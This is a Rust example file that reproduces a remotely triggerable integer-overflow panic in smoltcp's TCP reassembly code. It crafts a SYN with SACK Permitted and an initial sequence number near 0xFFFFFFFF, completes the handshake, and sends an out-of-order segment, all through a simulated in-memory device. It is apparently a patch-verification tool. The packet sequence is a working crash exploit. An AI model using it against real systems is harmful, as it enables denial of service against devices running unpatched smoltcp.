//! Standalone reproducer for the SACK integer overflow panic.
//!
//! Demonstrates that a remote attacker who completes a TCP handshake with
//! SACK Permitted and an ISN near 0xFFFFFFFF can crash the smoltcp process
//! by sending a single out-of-order segment.
//!
//! The crash occurs in AssemblerIter::next() at storage/assembler.rs:361:
//!   `self.left + self.offset` overflows because `SeqNumber.0 as usize`
//!   sign-extends a negative i32 to a near-usize::MAX value on 64-bit.
//!
//! Run:
//!   cargo run --example crash_sack_overflow --features="medium-ip,proto-ipv4,socket-tcp"
//!
//! Expected result on UNPATCHED code:
//!   thread 'main' panicked at 'attempt to add with overflow',
//!       src/storage/assembler.rs:361:35
//!
//! Expected result on PATCHED code:
//!   All 3 packets processed without panic.

use std::collections::VecDeque;

use smoltcp::iface::{Config, Interface, SocketSet};
use smoltcp::phy::{self, ChecksumCapabilities, Device, DeviceCapabilities, Medium};
use smoltcp::socket::tcp;
use smoltcp::time::Instant;
use smoltcp::wire::{
    HardwareAddress, IpAddress, IpCidr, IpProtocol, Ipv4Address, Ipv4Packet, TcpPacket,
};

// ---------------------------------------------------------------------------
// Network topology
// ---------------------------------------------------------------------------

const VICTIM_IP: Ipv4Address = Ipv4Address::new(10, 0, 0, 1);
const ATTACKER_IP: Ipv4Address = Ipv4Address::new(10, 0, 0, 2);
const VICTIM_PORT: u16 = 80;
const ATTACKER_PORT: u16 = 49500;

// Attacker's chosen ISN: near the top of the 32-bit space.
// After the SYN, remote_seq_no = ISN + 1 = 0xFFFFFFF1.
// As i32, that's -15.  `-15_i32 as usize` on 64-bit = 0xFFFF_FFFF_FFFF_FFF1,
// which overflows when added to any buffer position.
const ATTACKER_ISN: u32 = 0xFFFF_FFF0;

// ---------------------------------------------------------------------------
// Minimal Device that feeds pre-built packets into Interface::poll()
// ---------------------------------------------------------------------------

struct InjectorRxToken(Vec<u8>);

impl phy::RxToken for InjectorRxToken {
    fn consume<R, F>(self, f: F) -> R
    where
        F: FnOnce(&[u8]) -> R,
    {
        f(&self.0)
    }
}

// ---------------------------------------------------------------------------
// Packet construction helpers
// ---------------------------------------------------------------------------

fn build_tcp_segment(
    seq: u32,
    ack: u32,
    flags_syn: bool,
    flags_ack: bool,
    flags_psh: bool,
    tcp_options: &[u8],
    payload: &[u8],
) -> Vec<u8> {
    let opts_padded_len = (tcp_options.len() + 3) & !3; // pad to 4-byte boundary
    let header_len = 20 + opts_padded_len;
    let total_len = header_len + payload.len();
    let mut buf = vec![0u8; total_len];

    {
        let mut tcp = TcpPacket::new_unchecked(&mut buf);
        tcp.set_src_port(ATTACKER_PORT);
        tcp.set_dst_port(VICTIM_PORT);
        tcp.set_seq_number(smoltcp::wire::TcpSeqNumber(seq as i32));
        tcp.set_ack_number(smoltcp::wire::TcpSeqNumber(ack as i32));
        tcp.set_header_len(header_len as u8);
        tcp.set_syn(flags_syn);
        tcp.set_ack(flags_ack);
        tcp.set_psh(flags_psh);
        tcp.set_window_len(65535);
    }

    // Write TCP options after the 20-byte fixed header.
    buf[20..20 + tcp_options.len()].copy_from_slice(tcp_options);
    // NOP-pad to 4-byte boundary.
    for b in &mut buf[20 + tcp_options.len()..20 + opts_padded_len] {
        *b = 1; // NOP
    }

    // Write payload.
    buf[header_len..].copy_from_slice(payload);

    buf
}

fn wrap_in_ipv4(tcp_segment: &[u8]) -> Vec<u8> {
    let total_len = 20 + tcp_segment.len();
    let mut buf = vec![0u8; total_len];

    {
        let mut pkt = Ipv4Packet::new_unchecked(&mut buf);
        pkt.set_version(4);
        pkt.set_header_len(20);
        pkt.set_total_len(total_len as u16);
        pkt.set_dont_frag(true);
        pkt.set_hop_limit(64);
        pkt.set_next_header(IpProtocol::Tcp);
        pkt.set_src_addr(ATTACKER_IP);
        pkt.set_dst_addr(VICTIM_IP);
    }

    buf[20..].copy_from_slice(tcp_segment);
    buf
}

// ---------------------------------------------------------------------------
// Extract the server's ISN from the SYN-ACK response
// ---------------------------------------------------------------------------

/// After injecting the SYN and calling poll(), the server sends a SYN-ACK.
/// We need the server's sequence number to complete the handshake.
///
/// Since our Device drops TX frames, we instead read it from the socket's
/// internal state by observing the ack_number the server expects.
/// Alternatively, we capture TX and parse it -- but for simplicity we just
/// use a fixed placeholder.  smoltcp generates random ISNs, so we capture
/// the SYN-ACK from the device's transmit path.
struct CapturingDevice {
    rx_queue: VecDeque<Vec<u8>>,
    tx_queue: VecDeque<Vec<u8>>,
}

impl CapturingDevice {
    fn new() -> Self {
        Self {
            rx_queue: VecDeque::new(),
            tx_queue: VecDeque::new(),
        }
    }

    fn inject(&mut self, packet: Vec<u8>) {
        self.rx_queue.push_back(packet);
    }

    fn take_tx(&mut self) -> Vec<Vec<u8>> {
        self.tx_queue.drain(..).collect()
    }
}

impl Device for CapturingDevice {
    type RxToken<'a> = InjectorRxToken;
    type TxToken<'a> = CapturingTxToken<'a>;

    fn capabilities(&self) -> DeviceCapabilities {
        let mut caps = DeviceCapabilities::default();
        caps.medium = Medium::Ip;
        caps.max_transmission_unit = 1500;
        caps.checksum = ChecksumCapabilities::ignored();
        caps
    }

    fn receive(&mut self, _ts: Instant) -> Option<(Self::RxToken<'_>, Self::TxToken<'_>)> {
        self.rx_queue
            .pop_front()
            .map(|buf| (InjectorRxToken(buf), CapturingTxToken(&mut self.tx_queue)))
    }

    fn transmit(&mut self, _ts: Instant) -> Option<Self::TxToken<'_>> {
        Some(CapturingTxToken(&mut self.tx_queue))
    }
}

struct CapturingTxToken<'a>(&'a mut VecDeque<Vec<u8>>);

impl<'a> phy::TxToken for CapturingTxToken<'a> {
    fn consume<R, F>(self, len: usize, f: F) -> R
    where
        F: FnOnce(&mut [u8]) -> R,
    {
        let mut buf = vec![0u8; len];
        let result = f(&mut buf);
        self.0.push_back(buf);
        result
    }
}

// ---------------------------------------------------------------------------
// Main: reproduce the crash
// ---------------------------------------------------------------------------

fn main() {
    let now = Instant::from_millis(0);

    // -- Set up the smoltcp interface and a listening TCP socket --

    let mut device = CapturingDevice::new();
    let config = Config::new(HardwareAddress::Ip);
    let mut iface = Interface::new(config, &mut device, now);
    iface.update_ip_addrs(|addrs| {
        addrs
            .push(IpCidr::new(IpAddress::Ipv4(VICTIM_IP), 24))
            .unwrap();
    });

    let tcp_rx_buf = tcp::SocketBuffer::new(vec![0u8; 4096]);
    let tcp_tx_buf = tcp::SocketBuffer::new(vec![0u8; 4096]);
    let mut socket = tcp::Socket::new(tcp_rx_buf, tcp_tx_buf);
    socket.listen(VICTIM_PORT).unwrap();

    let mut sockets_storage: [_; 1] = Default::default();
    let mut sockets = SocketSet::new(&mut sockets_storage[..]);
    let handle = sockets.add(socket);

    println!("=== SACK Integer Overflow Reproducer ===");
    println!();
    println!(
        "Attacker ISN: 0x{:08X} (i32: {})",
        ATTACKER_ISN, ATTACKER_ISN as i32
    );
    println!(
        "After SYN:    remote_seq_no = 0x{:08X} (i32: {})",
        ATTACKER_ISN.wrapping_add(1),
        ATTACKER_ISN.wrapping_add(1) as i32
    );
    println!();

    // -- Packet 1: SYN with SACK Permitted --

    println!(
        "[1] Injecting SYN (seq=0x{:08X}) with SACK Permitted option...",
        ATTACKER_ISN
    );
    let sack_permitted = [4, 2]; // Kind=4, Len=2
    let syn = build_tcp_segment(ATTACKER_ISN, 0, true, false, false, &sack_permitted, &[]);
    device.inject(wrap_in_ipv4(&syn));
    iface.poll(now, &mut device, &mut sockets);

    // Extract server ISN from the SYN-ACK response.
    let tx_frames = device.take_tx();
    let server_isn = tx_frames
        .iter()
        .find_map(|frame| {
            let ip = Ipv4Packet::new_unchecked(frame.as_slice());
            let tcp = TcpPacket::new_unchecked(ip.payload());
            if tcp.syn() && tcp.ack() {
                Some(tcp.seq_number().0 as u32)
            } else {
                None
            }
        })
        .expect("server did not send SYN-ACK");

    println!(
        "       Server responded with SYN-ACK (server ISN=0x{:08X})",
        server_isn
    );

    // -- Packet 2: ACK completing the handshake --

    let client_seq = ATTACKER_ISN.wrapping_add(1);
    let server_ack = server_isn.wrapping_add(1);
    println!(
        "[2] Injecting ACK (seq=0x{:08X}, ack=0x{:08X}) to complete handshake...",
        client_seq, server_ack
    );
    let ack = build_tcp_segment(client_seq, server_ack, false, true, false, &[], &[]);
    device.inject(wrap_in_ipv4(&ack));
    iface.poll(now, &mut device, &mut sockets);

    {
        let sock = sockets.get::<tcp::Socket>(handle);
        println!("       Socket state: {:?}", sock.state());
    }

    // -- Packet 3: Out-of-order data segment (creates gap in assembler) --

    let gap = 100u32;
    let ooo_seq = client_seq.wrapping_add(gap);
    let payload = b"AAAAAAAAAA"; // 10 bytes
    println!(
        "[3] Injecting out-of-order data (seq=0x{:08X}, {} byte gap, {} bytes payload)...",
        ooo_seq,
        gap,
        payload.len()
    );
    println!();
    println!("    This triggers ack_reply() -> iter_data() -> AssemblerIter::next()");
    println!("    where the sign-extended offset causes the overflow.");
    println!();

    let ooo = build_tcp_segment(ooo_seq, server_ack, false, true, true, &[], payload);
    device.inject(wrap_in_ipv4(&ooo));

    // This is where the panic happens on unpatched code.
    iface.poll(now, &mut device, &mut sockets);

    println!("All 3 packets processed without panic -- fix is working.");
}
